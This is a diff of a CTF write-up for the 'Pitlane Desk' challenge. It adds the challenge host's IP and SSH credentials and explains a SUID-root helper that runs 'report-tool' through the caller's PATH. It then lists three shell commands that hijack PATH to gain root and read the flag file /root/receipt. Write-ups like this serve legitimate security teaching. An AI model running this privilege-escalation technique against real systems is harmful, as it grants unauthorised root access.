@@ -1,7 +1,7 @@
 ---
 title: "Pitlane Desk"
 ctf: "Safaricom CTF"
-date: 2026-10-04
+date: 2026-10-06
 category: misc
 difficulty: medium
 points: 300
@@ -11,13 +11,40 @@ author: "Strawhats"
 
 # Pitlane Desk
 
-## Summary
+> **Category:** MISC · **Points:** 300 · **Difficulty:** medium
+
+## Discovery, analysis & exploitation
+
+The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.
 
 - Desk app: http://54.72.82.22:8540/ (theme RACING)
+- SSH: player@54.72.82.22:8700  pw `matinee-visitor` (paramiko)
+- Container `d44a86ce1002`, Ubuntu 22.04. Root runs `python /app/service.py` (Flask).
+- `/app/settings.json` kind = `linux-path`; the flag is NOT in the web app — it is
+  written by `/app/linux/start.sh` to `/root/receipt` (0400 root) from `$FLAG`.
 
-## Solution
+## The intended path (not the Workshop Nocturne tar/HMAC worker — this box is different)
+`/app/linux/install.sh` installs a SUID-root helper:
+- `/usr/local/bin/stage-report` — built from `report.c`, `chmod 4755`.
+- `report.c`: `setgid(0); setuid(0); execvp("report-tool", ...)`.
+`execvp` searches the caller's `PATH`, so a fake `report-tool` placed earlier in
+PATH is executed **as root** (classic SUID PATH hijack).
 
-### Step 1: Run the solve script:
+## Winning steps
+```
+mkdir -p ~/bin
+printf '#!/bin/sh\nid\ncat /root/receipt\n' > ~/bin/report-tool && chmod +x ~/bin/report-tool
+PATH=~/bin:$PATH /usr/local/bin/stage-report
+```
+Output: `uid=0(root) ...` then `cat /root/receipt`.
+
+## Artifacts (kept out of git; no binary downloads needed)
+- All source read over SSH from the container: /app/service.py, /app/linux/{install.sh,report.c,start.sh}.
+- sha256(install.sh)=recorded below? not needed — sources live in-container, nothing downloaded.
+
+## Solve script
+
+`misc/pitlane-desk/solve.py`:
 
 ```python
 #!/usr/bin/env python3
@@ -53,8 +80,20 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 ```
+
+## Tools
+
+**Used in this solve:**
+
+- Python 3 (solver)
+
+**Other tools that fit this category:**
+
+- CyberChef (encoding chains)
+- z3 / SageMath (constraints)
+- pwntools (interaction)
+- Ciphey (auto-decode)
 
 ## Flag
 
